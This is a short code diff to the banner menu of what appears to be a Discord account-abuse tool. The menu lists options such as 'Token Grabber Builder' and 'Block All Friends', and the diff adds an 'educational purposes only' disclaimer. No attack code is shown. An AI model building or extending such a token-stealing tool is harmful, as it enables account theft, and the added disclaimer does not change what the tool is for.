@@ -32,7 +32,8 @@ ___________              .__                ________
                      ║ [8] Block All Friends         ║   ║ [17] EXIT                     ║
                      ║ [9] Token Grabber Builder     ║   ║                               ║
                      ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
-                     We recommend Option 13 and 11
+                     we recommend Option 13 and 11
+                     educational purposes only
 """
 option = Fore.RED + "     [>] "
 
